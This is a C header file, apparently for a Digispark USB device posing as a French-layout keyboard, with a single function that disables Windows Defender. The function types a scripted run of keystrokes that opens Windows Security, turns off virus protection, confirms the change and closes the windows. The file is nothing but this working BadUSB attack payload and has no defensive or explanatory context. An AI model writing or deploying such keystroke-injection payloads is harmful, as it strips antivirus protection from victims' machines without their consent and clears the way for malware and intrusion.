#include "DigiKeyboardFr.h"
#ifndef DISABLE_WINDOWS_DEFENDER_H
#define DISABLE_WINDOWS_DEFENDER_H

void disable_windows_defender();

void disable_windows_defender() {
      // Ouvre le menu
    DigiKeyboardFr.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
    DigiKeyboardFr.delay(500);

    // Ouvre les paramètres
    DigiKeyboardFr.print("para");
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(1500);

    // Ouvre windows defender
    DigiKeyboardFr.print("Securite Win");
    DigiKeyboardFr.delay(500);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(2000);

    // Ouvre protection contre les virus
    DigiKeyboardFr.sendKeyStroke(KEY_TAB);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_TAB);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_TAB);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_TAB);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(500);

    // Désactive la sécurité
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_SPACE);
    DigiKeyboardFr.delay(500);
    DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboardFr.delay(500);
    DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
    DigiKeyboardFr.delay(100);

    // Quite
    DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboardFr.delay(100);
    DigiKeyboardFr.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboardFr.delay(100);
}

#endif